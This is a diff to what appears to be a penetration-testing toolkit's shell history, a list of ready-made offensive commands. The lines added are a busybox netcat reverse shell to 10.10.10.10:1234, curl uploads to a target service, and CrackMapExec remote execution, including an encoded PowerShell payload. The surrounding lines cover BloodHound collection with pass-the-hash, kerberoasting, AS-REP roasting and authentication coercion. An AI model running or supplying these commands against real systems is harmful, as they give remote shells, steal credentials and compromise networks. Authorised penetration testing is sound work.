@@ -28,6 +28,7 @@ bloodhound-import -du neo4j -dp exegol4thewin *.json
 bloodhound-quickwin -u neo4j -p exegol4thewin
 bloodhound.py --zip -c All -d "$DOMAIN" -u "$USER" --hashes 'ffffffffffffffffffffffffffffffff':"$NT_HASH" -dc "$DC_HOST"
 bloodhound.py --zip -c All -d "$DOMAIN" -u "$USER" -p "$PASSWORD" -dc "$DC_HOST"
+busybox nc 10.10.10.10 1234 -e sh
 cat 20220426210232_users.json | jq '.data[].Properties'
 cat mailroom-ffuf.json| jq '.results[]|select(.status == '200')' | jq -c '{url:.url,length:.length}' | sort -u -t, -k2 | awk -F '"' '{print $4}' > 200.txt
 cat mailroom-ffuf.json| jq '.results[]|select(.status == '403')' | jq -c '{url:.url,length:.length}' | sort -u -t, -k2 | awk -F '"' '{print $4}' > 200.txt
@@ -39,6 +40,8 @@ cewl --depth 10 --with-numbers --write cewl.txt 192.168.10.10
 cloudfail.py --target seo.com --tor
 cloudscrap -u $URL -p 3 -d 3
 clusterd -i "http://$TARGET/"
+curl -k -u fr3d -F "path=@$FILE" https://$IP:9445/upload\?path\=/
+curl -k -u fr3d -F "mkdir=$DIR_NAME" https://$IP:9445/upload\?path=\/
 cme ldap "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" -M maq
 cme ldap "$TARGET" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --asreproast ASREProastables.txt --kdcHost "$DC_HOST"
 cme ldap "$TARGET" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --kerberoasting Kerberoastables.txt --kdcHost "$DC_HOST"
@@ -57,6 +60,8 @@ cme smb 192.168.56.0/24 -u "$USER" -p "$PASSWORD" --loggedon-users
 cme smb 192.168.56.0/24 -u "$USER" -p "$PASSWORD" --sessions
 cme smb 192.168.56.0/24 -u "$USER" -p "$PASSWORD" --shares
 cme smb 192.168.56.0/24 -u '' -p '' --shares
+cme smb $IP -u $USER -p $PASSWORD -x 'whoami'
+cme smb $IP -u $USER -p $PASSWORD -x 'powershell -e <base64 payload>'
 cme winrm $IP -u $USER -p $PASSWORD -x 'whoami'
 cmsmap -F -d "http://$TARGET/"
 coercer -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --listener "$ATTACKER_IP" --target "$DC_HOST"
